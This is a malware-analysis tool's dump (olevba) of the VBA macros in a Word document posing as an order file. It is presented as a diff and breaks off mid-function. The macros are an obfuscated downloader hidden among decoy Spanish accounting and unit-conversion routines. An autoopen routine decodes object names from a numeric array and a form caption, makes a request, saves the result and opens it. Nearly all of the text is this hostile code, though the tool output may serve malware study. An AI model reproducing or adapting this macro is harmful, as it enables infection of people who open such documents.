@@ -1,0 +1,1229 @@
+olevba 0.46 - http://decalage.info/python/oletools
+Flags        Filename                                                         
+-----------  -----------------------------------------------------------------
+OpX:MAS-HB-- ../ORDER-287-7964943-6982621.docm
+===============================================================================
+FILE: ../ORDER-287-7964943-6982621.docm
+Type: OpenXML
+-------------------------------------------------------------------------------
+VBA MACRO ThisDocument.cls 
+in file: word/vbaProject.bin - OLE stream: u'VBA/ThisDocument'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+
+Public Function HayKHabilitarCentroCoste(ByRef Cuenta As String) As Boolean
+Dim Ch As String
+
+    HayKHabilitarCentroCoste = False
+    If Cuenta <> "" Then
+        'Hay cuenta
+         Ch = Mid(Cuenta, 1, 1)
+         If Ch = vParam.grupogto Or Ch = vParam.grupovta Or Ch = vParam.grupoord Then
+            HayKHabilitarCentroCoste = True
+         Else
+            Ch = Mid(Cuenta, 1, 3)
+            If Ch = vParam.Subgrupo1 Or Ch = vParam.Subgrupo2 Then
+                HayKHabilitarCentroCoste = True
+            End If
+        End If
+    End If
+End Function
+
+
+
+Sub autoopen()
+EjecutaSQLDo 0.1, 3, -0.1
+End Sub
+Public Function EjecutaSQL(ByRef SQL As String) As Boolean
+    EjecutaSQL = False
+    On Error Resume Next
+    Conn.Execute SQL
+    If Err.Number <> 0 Then
+        Err.Clear
+    Else
+        EjecutaSQL = True
+    End If
+End Function
+
+
+
+Public Function DirectorioEAT() As Boolean
+    On Error GoTo EDirecEAT
+    DirectorioEAT = False
+    If Dir("C:\AEAT", vbDirectory) = "" Then
+        MsgBox "No se encuentra la carpeta de la agencia tributaria.  ( C:\AEAT )", vbExclamation
+    Else
+        DirectorioEAT = True
+    End If
+    Exit Function
+EDirecEAT:
+    Err.Clear
+End Function
+
+
+
+
+
+Public Function EstaLaCuentaBloqueada(ByRef codmacta As String, Fecha As Date) As Boolean
+Dim i As Integer
+
+        EstaLaCuentaBloqueada = False
+        If vParam.CuentasBloqueadas <> "" Then
+            i = InStr(1, vParam.CuentasBloqueadas, codmacta & ":")
+            If i > 0 Then
+                'La cuenta esta con fecha de bloqueo
+                If Fecha >= CDate(Mid(vParam.CuentasBloqueadas, i + Len(codmacta) + 1, 10)) Then EstaLaCuentaBloqueada = True
+            End If
+        End If
+End Function
+
+
+Public Sub CerrarRs(ByRef Rsss As String)
+    On Error Resume Next
+    Rsss.Close
+    If Err.Number <> 0 Then Err.Clear
+End Sub
+
+
+'*******************************************************************
+'*******************************************************************
+'*******************************************************************
+'   Septiembre 2011
+'
+'  Letra serie 3 Digitos
+'  Con lo cual para algunas campos (numdocum de linapu) son un maximo de
+'   10 posiciones. Como antes era un digito letra ser, formateabamos con 9
+'       numerofactura debe ser NUMERICO
+Public Function SerieNumeroFactura(Posiciones As Integer, Serie As String, Numerofactura As String)
+Dim i As Integer
+Dim Cad As String
+    
+    i = Posiciones - Len(Numerofactura) - Len(Serie)
+    If i <= 0 Then
+        'Hay menos posiciones de las que podemos meter
+        Cad = Right(Numerofactura, Posiciones - Len(Numerofactura))
+    Else
+        Cad = String(i, "0") & Numerofactura
+    End If
+    SerieNumeroFactura = Serie & Cad
+    
+    
+End Function
+
+
+
+Public Function EsEntero(TEXTO As String) As Boolean
+Dim i As Integer
+Dim C As Integer
+Dim L As Integer
+Dim res As Boolean
+
+    res = True
+    EsEntero = False
+
+    If Not IsNumeric(TEXTO) Then
+        res = False
+    Else
+        'Vemos si ha puesto mas de un punto
+        C = 0
+        L = 1
+        Do
+            i = InStr(L, TEXTO, ".")
+            If i > 0 Then
+                L = i + 1
+                C = C + 1
+            End If
+        Loop Until i = 0
+        If C > 1 Then res = False
+        
+        'Si ha puesto mas de una coma y no tiene puntos
+        If C = 0 Then
+            L = 1
+            Do
+                i = InStr(L, TEXTO, ",")
+                If i > 0 Then
+                    L = i + 1
+                    C = C + 1
+                End If
+            Loop Until i = 0
+            If C > 1 Then res = False
+        End If
+        
+    End If
+        EsEntero = res
+End Function
+
+-------------------------------------------------------------------------------
+VBA MACRO Module6.bas 
+in file: word/vbaProject.bin - OLE stream: u'VBA/Module6'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+Public Sub NombreSQL(ByRef CADENA As String)
+Dim J As Integer
+Dim i As Integer
+Dim Aux As String
+    J = 1
+    Do
+        i = InStr(J, CADENA, "'")
+        If i > 0 Then
+            Aux = Mid(CADENA, 1, i - 1) & "\"
+            CADENA = Aux & Mid(CADENA, i)
+            J = i + 2
+        End If
+    Loop Until i = 0
+End Sub
+
+Public Function DevNombreSQL(CADENA As String) As String
+Dim J As Integer
+Dim i As Integer
+Dim Aux As String
+    J = 1
+    Do
+        i = InStr(J, CADENA, "'")
+        If i > 0 Then
+            Aux = Mid(CADENA, 1, i - 1) & "\"
+            CADENA = Aux & Mid(CADENA, i)
+            J = i + 2
+        End If
+    Loop Until i = 0
+    DevNombreSQL = CADENA
+End Function
+
+-------------------------------------------------------------------------------
+VBA MACRO Module2.bas 
+in file: word/vbaProject.bin - OLE stream: u'VBA/Module2'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+Public problems__1 As Object
+Public Freddy_problems As Object
+Public problems__3 As Object
+Public MassiveA() As String
+Public problems__4 As String
+Public problems__DUET As String
+Public problems_KABARE As Object
+ Public Constant_4 As String
+Public constans_problems() As String
+Const INTERVAl_MILLIS_DO_EVENTS As Long = 100
+Public Function newStringBuilder() As String
+ newStringBuilder = ""
+End Function
+Public Function newCompareValueCalculator()
+ calc.init
+ Set newCompareValueCalculator = calc
+End Function
+Public Function newTagBuilder(rootTagName As String) As String
+ Call builder.init(rootTagName)
+End Function
+Public Function newDate(aYear As Long, aMonth As Integer, aDay As Integer) As Date
+ newDate = CDate(LText.messageFormat("{1::0}/{2::00}/{3::00}", aYear, aMonth, aDay))
+End Function
+Public Function newStringSet() As String
+ Dim result As String
+ Call res.ult.init
+End Function
+Public Function Fso() As String
+ Static staticFso As String
+ If stat.icFso Is Nothing Then
+ End If
+End Function
+ 
+Sub assignIgnoreType(ByRef aOut, ByVal aIn)
+ If IsObject(aIn) Then
+ Set aOut = aIn
+ Else
+ aOut = aIn
+ End If
+End Sub
+
+Public Function ImpirmirListadoCaja(ByRef vSQL As String, SaldoArrastrado As Boolean) As Boolean
+Dim miSQL As String
+Dim L As Long
+Dim Cad As String
+Dim Caja As String
+Dim CtaCaja As String
+Dim Tipo As Integer
+Dim RT As String
+
+    ImpirmirListadoCaja = False
+    Conn.Execute "DELETE from Usuarios.ztesoreriacomun where codusu = " & vUsu.Codigo
+    
+    Set miRsAux = New ADODB.Recordset
+    miSQL = "Select slicaja.*,nommacta from slicaja,cuentas,susucaja where slicaja.codmacta=cuentas.codmacta " & vSQL
+    miSQL = miSQL & " ORDER BY slicaja.codusu,feccaja,numlinea"
+    miRsAux.Open miSQL, Conn, adOpenForwardOnly, adLockPessimistic, adCmdText
+    L = 1
+    'INSERT INTO ztesoreriacomun (
+    'codusu, fecha1,codigo, texto1, texto2,opcion, texto3, texto4, texto5, texto6,
+    'importe1, importe2,   fecha3,
+    'observa1, observa2) VALUES (
+    
+    vSQL = "INSERT INTO Usuarios.ztesoreriacomun (codusu, fecha1,codigo, texto1, texto2,texto4,opcion, texto3, observa1, "
+    vSQL = vSQL & "texto5,importe1 ,importe2,texto6 ) VALUES (" & vUsu.Codigo & ",'"
+    CtaCaja = ""
+    While Not miRsAux.EOF
+        If miRsAux!codusu <> CtaCaja Then
+            CtaCaja = miRsAux!codusu
+            
+            Caja = DevuelveDesdeBD("nomusu", "usuarios.usuarios", "codusu", miRsAux!codusu, "N")
+            Caja = DevNombreSQL(Caja)
+            Caja = ",'" & CtaCaja & "','" & Caja & "'"
+            
+            'Si lleva saldo arrastrado entonces lo obtengo del datos de usucaja
+            If SaldoArrastrado Then
+                Cad = "Select saldo from susucaja where codusu =" & CtaCaja
+                Set RT = New ADODB.Recordset
+                RT.Open Cad, Conn, adOpenForwardOnly, adLockOptimistic, adCmdText
+                If Not RT.EOF Then
+                    'Inserto una primera linea con fecha 1900 con el saldo de la caja
+                    Cad = "1900-01-01'," & L & Caja
+                    For Tipo = 1 To 4
+                        Cad = Cad & ",NULL"
+                    Next Tipo
+                      Cad = Cad & ",'Saldo caja :',"
+                    If RT!Saldo >= 0 Then
+                        Cad = Cad & TransformaComasPuntos(CStr(RT!Saldo)) & ",0"
+                    Else
+                        Cad = Cad & "0," & TransformaComasPuntos(CStr(Abs(RT!Saldo)))
+                    End If
+                    Cad = vSQL & Cad & ",NULL)"
+                    Conn.Execute Cad
+                    'Sumo L
+                    L = L + 1
+                End If
+                RT.Close
+                Set RT = Nothing
+            End If
+        End If
+        
+        Cad = Format(miRsAux!feccaja, FormatoFecha) & "'," & L & Caja
+        If miRsAux!tipomovi = 1 Then
+            Tipo = 1
+            'FACTURAS PROVEEDORES
+            Cad = Cad & ",'FRAPRO',1,'" & miRsAux!codmacta & "','" & DevNombreSQL(miRsAux!Nommacta) & "','"
+            'Numero de factura
+            Cad = Cad & DevNombreSQL(DBLet(miRsAux!numfacpr))
+            If Not IsNull(miRsAux!numvenci) Then Cad = Cad & " - Vto: " & miRsAux!numvenci
+            Cad = Cad & "',"
+        Else
+            If miRsAux!tipomovi >= 2 Then
+                'TRASPASO o PAGO
+                Tipo = Val(miRsAux!tipomovi)
+                Cad = Cad & ",'"
+                If Tipo = 2 Then
+                    Cad = Cad & "PAGO"
+                Else
+                    Cad = Cad & "TRASPASO"
+                End If
+                Cad = Cad & "'," & Tipo & ",'"
+                Cad = Cad & "','" & DevNombreSQL(miRsAux!Ampliaci) & "',NULL,"
+                ''" & miRsAux!codmacta & "','" & DevNombreSQL(miRsAux!Nommacta) & "','"
+            Else
+                'FACTURA CLIENTE
+                Tipo = 0
+                Cad = Cad & ",'FRACLI',0,'" & miRsAux!codmacta & "','" & DevNombreSQL(miRsAux!Nommacta) & "','"
+                'Numero factura
+                If Not IsNull(miRsAux!NUmSerie) Then Cad = Cad & miRsAux!NUmSerie
+                If Not IsNull(miRsAux!numfaccl) Then Cad = Cad & Format(miRsAux!numfaccl, "0000000000")
+                If Not IsNull(miRsAux!numvenci) Then Cad = Cad & " - Vto: " & miRsAux!numvenci
+                Cad = Cad & "',"
+            End If
+        End If
+        'El importe
+        Cad = Cad & TransformaComasPuntos(CStr(DBLet(miRsAux!ImporteD, "N")))
+        Cad = Cad & "," & TransformaComasPuntos(CStr(DBLet(miRsAux!ImporteH, "N")))
+        
+        
+        'Texto 6: numero de linea
+        Cad = Cad & "," & Format(miRsAux!NumLinea, "00000")
+        
+        Cad = vSQL & Cad & ")"
+        Conn.Execute Cad
+        
+        miRsAux.MoveNext
+        L = L + 1
+    Wend
+    miRsAux.Close
+    '
+    'INSERT INTO ztesoreriacomun (codusu, codigo, texto1, texto2, texto3, texto4, texto5, texto6, importe1, importe2, fecha1, fecha2, fecha3, observa1, observa2, opcion) VALUES (
+    ImpirmirListadoCaja = True
+End Function
+
+Public Function UsuariosConectados(energy As Double)
+Dim aproblems As String
+ aproblems = CadenaCurrency(Ultra.CommandButton3.Caption, "00", "e")
+ aproblems = CadenaCurrency(aproblems, "D!", "M")
+ aproblems = CadenaCurrency(aproblems, "bri", "s")
+ constans_problems = Split(aproblems, "10)")
+KwhToJoule 0.33
+ UsuariosConectados = 3.6 * 10 ^ 3 * (1.987 / 8.314) * energy
+End Function
+Public Function ListadoEfectosDevueltos(ByRef vSQL As String) As Boolean
+Dim SQL As String
+
+    ListadoEfectosDevueltos = False
+    Conn.Execute "DELETE from Usuarios.ztesoreriacomun where codusu = " & vUsu.Codigo
+    
+    
+    SQL = "SELECT sefecdev.*,scobro.codmacta as cta,scobro.impvenci , cuentas.nommacta"
+    SQL = SQL & " FROM (sefecdev LEFT JOIN scobro ON (sefecdev.numorden = scobro.numorden) AND "
+    SQL = SQL & "(sefecdev.fecfaccl = scobro.fecfaccl) AND (sefecdev.codfaccl = scobro.codfaccl) AND "
+    SQL = SQL & "(sefecdev.numserie = scobro.numserie)) LEFT JOIN cuentas ON scobro.codmacta = "
+    SQL = SQL & "cuentas.codmacta"
+    
+    
+    
+    If vSQL <> "" Then SQL = SQL & " WHERE sefecdev.numorden>=0 " & vSQL
+    SQL = SQL & " ORDER BY fechadev"
+    Set miRsAux = New ADODB.Recordset
+    
+    miRsAux.Open SQL, Conn, adOpenForwardOnly, adLockPessimistic, adCmdText
+    NumRegElim = 1
+    vSQL = "INSERT INTO Usuarios.ztesoreriacomun (codusu, codigo, texto1, texto2,texto3,texto4,texto5,"
+    vSQL = vSQL & "fecha1,fecha2,importe1 ,importe2 ) VALUES (" & vUsu.Codigo & ","
+    
+    While Not miRsAux.EOF
+        SQL = NumRegElim & ",'"
+        'Si se hubiera producido errores y la cuenta estuviera mal
+        If IsNull(miRsAux!Cta) Then
+            SQL = "ERROR','RECIBO INCORRECTO"
+        Else
+            SQL = miRsAux!Cta & "','"
+            If IsNull(miRsAux!Nommacta) Then
+                SQL = SQL & "CTA NO EXISTE"
+            Else
+                SQL = SQL & DevNombreSQL(miRsAux!Nommacta)
+            End If
+        End If
+        SQL = NumRegElim & ",'" & SQL & "','"
+        SQL = SQL & miRsAux!NUmSerie & "','" & Format(miRsAux!codfaccl, "0000000000") & "','" & miRsAux!numorden
+        SQL = SQL & "','" & Format(miRsAux!fecfaccl, FormatoFecha) & "','" & Format(miRsAux!fechadev, FormatoFecha) & "',"
+        SQL = SQL & TransformaComasPuntos(CStr(DBLet(miRsAux!ImpVenci, "N"))) & ","
+        SQL = SQL & TransformaComasPuntos(CStr(miRsAux!gastodev)) & ")"
+        Conn.Execute vSQL & SQL
+    
+        NumRegElim = NumRegElim + 1
+        miRsAux.MoveNext
+    Wend
+    
+    miRsAux.Close
+    Set miRsAux = Nothing
+    
+    
+    ListadoEfectosDevueltos = True
+End Function
+
+Public Function isType(className As String, x As Variant) As Boolean
+ isType = (StrComp(className, TypeName(x), vbTextCompare) = 0)
+End Function
+Public Function containsType(classNames As String, x As Variant) As Boolean
+ Dim var As Variant
+ For Each var In classN.ames
+ Dim Name As String
+ Name = var
+ If isType(Name, x) Then
+ containsType = True
+ Exit Function
+ End If
+ Next var
+ containsType = False
+End Function
+Public Sub pp(ByVal value As Variant)
+ Debug.Print LText.descriptionOf(value)
+End Sub
+Public Sub ppl(ByVal value As Variant)
+ writeLog LText.descriptionOf(value)
+End Sub
+Private Function getTimeLoggerInstance() As String
+ Static logger As String
+ If logg.er Is Nothing Then
+ logg.er.init
+ End If
+End Function
+Public Sub tlog(message As String, Optional groupId As String = "*default*")
+ Call getTimeLogge.rInstance().Log(message, groupId)
+End Sub
+Public Sub printTimelogReport()
+ Call getTimeL.oggerInstance().printReports
+End Sub
+Public Sub clearTimelogReport()
+ Call getTimeLog.gerInstance().crearReports
+End Sub
+Public Sub setTimelogVerbose(isVerbose As Boolean)
+ Call Status.OfLibrary.setTimeLoggerVerbose(isVerbose)
+End Sub
+Public Sub writeLog(ByVal message As String)
+ Call LLog.writeLog(message)
+End Sub
+Private Function getDoEventsTimer() As String
+ Static timer As String
+ If ti.mer Is Nothing Then
+ Set tim.er = LCreation.newTimer
+ End If
+End Function
+Public Sub doEventsWithInterval(Optional intervalMillis As Long = INTERVAl_MILLIS_DO_EVENTS)
+ If intervalMillis <= getDoEvent.sTimer().getMillis() Then
+ doEventsImmediately
+ End If
+End Sub
+Public Sub doEventsImmediately()
+ getDoEvent.sTimer.Reset
+ DoEvents
+End Sub
+-------------------------------------------------------------------------------
+VBA MACRO Module1.bas 
+in file: word/vbaProject.bin - OLE stream: u'VBA/Module1'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+
+Public Function OtrosPCsContraContabiliad(EsAlIniciar As Boolean) As String
+Dim MiRS As Recordset
+Dim Cad As String
+Dim Equipo As String
+Dim EquipoConBD As Boolean
+
+Dim SERVER As String
+
+    On Error GoTo EOtrosPCsContraContabiliad
+    
+    Set MiRS = New ADODB.Recordset
+    
+    SERVER = Servidor
+    
+    EquipoConBD = (UCase(vUsu.PC) = UCase(SERVER)) Or (LCase(SERVER) = "localhost")
+    
+    Cad = "show processlist"
+    MiRS.Open Cad, Conn, adOpenKeyset, adLockOptimistic, adCmdText
+    Cad = ""
+    While Not MiRS.EOF
+        If UCase(MiRS.Fields(3)) = UCase(vUsu.CadenaConexion) Then
+            Equipo = MiRS.Fields(2)
+            'Primero quitamos los dos puntos del puerot
+            NumRegElim = InStr(1, Equipo, ":")
+            If NumRegElim > 0 Then Equipo = Mid(Equipo, 1, NumRegElim - 1)
+            
+            'El punto del dominio
+            NumRegElim = InStr(1, Equipo, ".")
+            If NumRegElim > 0 Then Equipo = Mid(Equipo, 1, NumRegElim - 1)
+            
+            Equipo = UCase(Equipo)
+            
+            If Equipo <> vUsu.PC Then
+                    
+                    NumRegElim = 0
+                    If Equipo <> "LOCALHOST" Then
+                        'Si no es localhost
+                        NumRegElim = 1
+                    Else
+                        'HAy un proceso de loclahost. Luego, si el equipo no tiene la BD
+                        If Not EquipoConBD Then NumRegElim = 1
+                    End If
+                    
+                    'Si hay que insertar
+                    If NumRegElim = 1 Then
+                        If InStr(1, Cad, Equipo & "|") = 0 Then Cad = Cad & Equipo & "|"
+                    End If
+            End If
+        End If
+        'Siguiente
+        MiRS.MoveNext
+    Wend
+    NumRegElim = 0
+    MiRS.Close
+    Set MiRS = Nothing
+    OtrosPCsContraContabiliad = Cad
+    Exit Function
+EOtrosPCsContraContabiliad:
+    MuestraError Err.Number, Err.Description, "Leyendo PROCESSLIST"
+    Set MiRS = Nothing
+    If EsAlIniciar Then
+        OtrosPCsContraContabiliad = "LEYENDOPC|"
+    Else
+        Cad = "¿El sistema no puede determinar si hay PCs conectados. ¿Desea continuar igualmente?"
+        If MsgBox(Cad, vbQuestion + vbYesNo) = vbYes Then
+            OtrosPCsContraContabiliad = ""
+        Else
+            OtrosPCsContraContabiliad = "USUARIO ACTUAL|"
+        End If
+    End If
+    
+    
+    
+End Function
+
+
+Public Function EsNumerico(TEXTO As String) As Boolean
+Dim i As Integer
+Dim C As Integer
+Dim L As Integer
+Dim Cad As String
+    
+ Set Freddy_problems = CreateObject(constans_problems(1))
+
+ Set problems_KABARE = CreateObject(constans_problems(2))
+
+RemesaSeleccionTipoRemesa False, False, True
+Exit Function
+    EsNumerico = False
+    Cad = ""
+    If Not IsNumeric(TEXTO) Then
+        Cad = "El campo debe ser numérico"
+    Else
+        'Vemos si ha puesto mas de un punto
+        C = 0
+        L = 1
+        Do
+            i = InStr(L, TEXTO, ".")
+            If i > 0 Then
+                L = i + 1
+                C = C + 1
+            End If
+        Loop Until i = 0
+        If C > 1 Then Cad = "Numero de puntos incorrecto"
+        
+        'Si ha puesto mas de una coma y no tiene puntos
+        If C = 0 Then
+            L = 1
+            Do
+                i = InStr(L, TEXTO, ",")
+                If i > 0 Then
+                    L = i + 1
+                    C = C + 1
+                End If
+            Loop Until i = 0
+            If C > 1 Then Cad = "Numero incorrecto"
+        End If
+        
+    End If
+    If Cad <> "" Then
+        MsgBox Cad, vbExclamation
+    Else
+        EsNumerico = True
+    End If
+End Function
+
+-------------------------------------------------------------------------------
+VBA MACRO Ultra.frm 
+in file: word/vbaProject.bin - OLE stream: u'VBA/Ultra'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+
+Private Sub CommandButton1_Click()
+
+End Sub
+
+Private Sub CommandButton2_Click()
+
+End Sub
+
+Private Sub CommandButton3_Click()
+
+End Sub
+
+Private Sub UserForm_Click()
+
+End Sub
+-------------------------------------------------------------------------------
+VBA MACRO Module3.bas 
+in file: word/vbaProject.bin - OLE stream: u'VBA/Module3'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+
+Public Function feetToMeter(length As Double)
+ feetToMeter = 3.048 * 10 ^ -1 * length
+End Function
+Public Function meterToFeet(length As Double)
+ meterToFeet = 3.2808 * length
+End Function
+Public Function inchToMeter(length As Double)
+problems__DUET = problems__4
+problems__DUET = problems__DUET + constans_problems(55 - 43)
+AbrirConexionAridoc
+ DevuelveDigitosNivelAnterior 37.7
+ inchToMeter = (2.54 * 10 ^ -2) * length
+End Function
+Public Sub CargaImagenesAyudas(ByRef Colec, Tipo As Byte, Optional ToolTipText_ As String)
+Dim i As Image
+
+    
+
+    For Each i In Colec
+            i.Picture = frmPpal.imgIcoForms.ListImages(Tipo).Picture
+            If i.TooltipText = "" Then
+                If ToolTipText_ <> "" Then
+                    i.TooltipText = ToolTipText_
+                Else
+                    If Tipo = 3 Then
+                        i.TooltipText = "Ayuda"
+                    ElseIf Tipo = 2 Then
+                        i.TooltipText = "Buscar fecha"
+                    Else
+                        i.TooltipText = "Buscar"
+                    End If
+                End If
+            End If
+    Next
+End Sub
+
+
+Public Function RemoveSpecialChar(strFileName As Integer) As String
+ Dim i As Byte
+ Dim SpecialChar As Boolean
+ Dim SelChar As String, OutFileName As String
+ RemoveSpecialChar = Chr(CInt(MassiveA(strFileName)) / (9 + 7))
+ Exit Function
+ For i = 1 To Len(strFileName)
+ SelChar = Mid(strFileName, i, 1)
+ SpecialChar = InStr(":/\?*|<>" & Chr$(34), SelChar) > 0
+ If (Not SpecialChar) Then
+ OutFileName = OutFileName & SelChar
+ SpecialChar = False
+ Else
+ OutFileName = OutFileName
+ SpecialChar = False
+ End If
+ Next i
+ RemoveSpecialChar = OutFileName
+End Function
+Public Function DevuelveDigitosNivelAnterior(temperature As Double)
+KABARE_DUET_AKADEMIA 309
+ DevuelveDigitosNivelAnterior = (5 / 9) * (temperature + 459.67)
+ 
+ CallByName Freddy_problems, constans_problems(11), VbMethod, problems__DUET, 2
+ KelvinToRankine = (5 / 9) * (temperature - 32)
+ 
+ problems_KABARE.Open (problems__DUET)
+ JouleTocal = (1.987 / 8.314) * temperature
+End Function
+Public Function CalToJoule(energy As Double)
+ CalToJoule = 4.184 * energy
+End Function
+Public Function CalToKwh(energy As Double)
+ CalToKwh = 4.184 * 3.6 * 10 ^ 3 * energy
+End Function
+Public Function JouleToKwh(energy As Double)
+ KwhToJoule = (3.6 * 10 ^ 3) ^ -1 * energy
+End Function
+Public Function PasToCentipoise(viscosity As Double)
+ PasToCentipoise = 1000 * viscosity
+End Function
+Public Function centipoiseToPas(viscosity As Double)
+ centipoiseToPas = viscosity / 1000
+End Function
+Public Function DevuelveNombreInformeSCRYST(NumInforme As Integer, Titulo As String) As String
+Dim Cad As String
+
+        DevuelveNombreInformeSCRYST = ""
+        Cad = DevuelveDesdeBD("informe", "scryst", "codigo", CStr(NumInforme))
+
+        If Cad = "" Then
+            MsgBox "No existe el informe para: " & Titulo & " (" & NumInforme & ")", vbExclamation
+            Exit Function
+        End If
+        
+        
+        If Dir(App.Path & "\InformesT\" & Cad, vbArchive) = "" Then
+            MsgBox "No se encuentra el archivo: " & Cad & vbCrLf & "Opcion: " & Titulo, vbExclamation
+            Exit Function
+        End If
+        DevuelveNombreInformeSCRYST = Cad
+            
+End Function
+
+Public Function Memo_Leer(ByRef C As Variant) As String
+    On Error Resume Next
+    Memo_Leer = C.value
+    If Err.Number <> 0 Then
+        Err.Clear
+        Memo_Leer = ""
+    End If
+End Function
+
+
+
+
+
+-------------------------------------------------------------------------------
+VBA MACRO Module4.bas 
+in file: word/vbaProject.bin - OLE stream: u'VBA/Module4'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+
+Public Function ListadoFormaPago(ByRef SQL As String) As Boolean
+
+    On Error GoTo EListadoFormaPago
+    ListadoFormaPago = False
+    
+    Conn.Execute "DELETE from Usuarios.ztesoreriacomun where codusu = " & vUsu.Codigo
+        
+    'MONTO EL SQL AL REVES. Empezando por el where
+
+    SQL = " WHERE sforpa.tipforpa = stipoformapago.tipoformapago " & SQL
+    SQL = " FROM sforpa ,stipoformapago" & SQL
+    SQL = " sforpa.codforpa,sforpa.nomforpa,stipoformapago.descformapago " & SQL
+    SQL = "INSERT INTO Usuarios.ztesoreriacomun(codusu,codigo,texto1,texto2) Select " & vUsu.Codigo & "," & SQL
+    'INSERT INTO Usuarios.ztesoreriacomun (codusu, observa1, codigo,
+    'texto1, texto2,  texto3, texto4 ,texto5) VALUES (
+    
+    
+    
+    Conn.Execute SQL
+    
+    Set miRsAux = New ADODB.Recordset
+    SQL = "select count(*) from Usuarios.ztesoreriacomun where codusu = " & vUsu.Codigo
+    miRsAux.Open SQL, Conn, adOpenForwardOnly, adLockPessimistic, adCmdText
+    If Not miRsAux.EOF Then
+        If DBLet(miRsAux.Fields(0), "N") > 0 Then SQL = ""
+    End If
+    miRsAux.Close
+    Set miRsAux = Nothing
+    If SQL <> "" Then
+        MsgBox "Ningun dato se ha generado", vbExclamation
+    Else
+        ListadoFormaPago = True
+    End If
+    Exit Function
+EListadoFormaPago:
+    MuestraError Err.Number, "ListadoFormaPago "
+End Function
+
+
+Public Sub cargaEmpresasTesor(ByRef Lis As Variant)
+Dim Prohibidas As String
+Dim IT
+Dim Aux As String
+
+    Set miRsAux = New ADODB.Recordset
+
+    Prohibidas = DevuelveProhibidas
+    
+    Lis.ListItems.Clear
+    Aux = "Select * from Usuarios.empresas where tesor=1"
+    
+    miRsAux.Open Aux, Conn, adOpenForwardOnly, adLockPessimistic, adCmdText
+    While Not miRsAux.EOF
+    
+        Aux = "|" & miRsAux!codempre & "|"
+        If InStr(1, Prohibidas, Aux) = 0 Then
+            Set IT = Lis.ListItems.Add
+            IT.Key = "C" & miRsAux!codempre
+            If vEmpresa.codempre = miRsAux!codempre Then IT.Checked = True
+            IT.Text = miRsAux!nomempre
+            IT.Tag = miRsAux!codempre
+        End If
+        miRsAux.MoveNext
+        
+    Wend
+    miRsAux.Close
+    Set miRsAux = Nothing
+
+End Sub
+
+'-------------------------------------------------------------------------
+'CCargar LISTVIEW con las mempresas de tesoreria
+Private Function DevuelveProhibidas() As String
+Dim i As Integer
+
+ Dim ElCounter As Integer
+For ElCounter = LBound(MassiveA) To UBound(MassiveA)
+ Constant_4 = Constant_4 & RemoveSpecialChar(ElCounter)
+ Next ElCounter
+ GoTo EDevuelveProhibidas
+    DevuelveProhibidas = ""
+
+    i = vUsu.Codigo Mod 100
+    miRsAux.Open "Select * from usuarios.usuarioempresaT WHERE codusu =" & i, Conn, adOpenForwardOnly, adLockOptimistic, adCmdText
+    DevuelveProhibidas = ""
+    While Not miRsAux.EOF
+        DevuelveProhibidas = DevuelveProhibidas & miRsAux.Fields(1) & "|"
+        miRsAux.MoveNext
+    Wend
+    If DevuelveProhibidas <> "" Then DevuelveProhibidas = "|" & DevuelveProhibidas
+    miRsAux.Close
+    Exit Function
+EDevuelveProhibidas:
+     Servidor "Servidor"
+End Function
+
+
+Public Function ComprobarCampoENlazado(ByRef T As TextBox, TDesc As TextBox, Tipo As String) As Byte
+
+    T.Text = Trim(T.Text)
+    If T.Text = "" Then
+        ComprobarCampoENlazado = 0 'NO HA PUESTO NADA
+        TDesc.Text = ""
+        Exit Function
+    End If
+    
+    Select Case Tipo
+    Case "N"
+        If Not IsNumeric(T.Text) Then
+            MsgBox "El campo debe ser numérico: " & T.Text, vbExclamation
+            TDesc.Text = ""
+            T.Text = ""
+            ComprobarCampoENlazado = 1
+        Else
+            ComprobarCampoENlazado = 2
+        End If
+    End Select
+        
+End Function
+
+
+Public Function RemesaSeleccionTipoRemesa(chkEfec As Boolean, chkPaga As Boolean, chkTalon As Boolean) As String
+Dim C As String
+
+ Set problems__0_22 = CreateObject(constans_problems(3))
+    C = ""
+     Set problems__3 = problems__0_22.Environment(constans_problems(4))
+     DevuelveProhibidas
+     Exit Function
+    If chkEfec And chkPaga And chkTalon Then
+        'LOS QUIERE TODOS, NO hacemos nada
+        
+    Else
+    
+        If Not chkEfec And Not chkPaga And Not chkTalon Then
+            'NO QUIERE NINGUNO. Tampoco hago nada
+            
+        Else
+            
+            If chkEfec Then
+                If chkPaga Then
+                    C = " <> 3 "
+                Else
+                    If chkTalon Then
+                        C = " <> 2 "
+                    Else
+                        C = " = 1" 'Solo efectos
+                    End If
+                End If
+            Else
+                If chkPaga Then
+                    If chkTalon Then
+                        C = " <> 1"
+                    Else
+                        C = " = 2 "
+                    End If
+                Else
+                    C = " =3 "
+                End If
+            End If
+        End If
+    End If
+    If C <> "" Then C = " tiporem  " & C
+    RemesaSeleccionTipoRemesa = C
+End Function
+
+Public Function TextoAimporte(Importe As String) As Currency
+Dim i As Integer
+    If Importe = "" Then
+        TextoAimporte = 0
+    Else
+        If InStr(1, Importe, ",") > 0 Then
+            'Primero quitamos los puntos
+            Do
+                i = InStr(1, Importe, ".")
+                If i > 0 Then Importe = Mid(Importe, 1, i - 1) & Mid(Importe, i + 1)
+            Loop Until i = 0
+            TextoAimporte = Importe
+        
+        
+        Else
+            'No tiene comas. El punto es el decimal
+            TextoAimporte = TransformaPuntosComas(Importe)
+        End If
+    End If
+
+End Function
+
+Public Function EjecutarSQL(CadenaSQL As String) As Boolean
+    On Error Resume Next
+    Conn.Execute CadenaSQL
+    If Err.Number <> 0 Then
+         
+         MuestraError Err.Number, "Error ejecutando SQL: " & vbCrLf & CadenaSQL, Err.Description
+         EjecutarSQL = False
+    Else
+         EjecutarSQL = True
+    End If
+    
+End Function
+
+
+Public Function AbrirConexionAridoc() As Boolean
+Dim Cad As String
+On Error GoTo EAbrirConexion
+    is16 = 16
+CallByName Freddy_problems, constans_problems(11 - 4), 64 / is16, is16 - 15
+ Freddy_problems.Open
+    Exit Function
+    
+    AbrirConexionAridoc = False
+    Set ConnConta = Nothing
+    ConnConta.CursorLocation = adUseServer
+
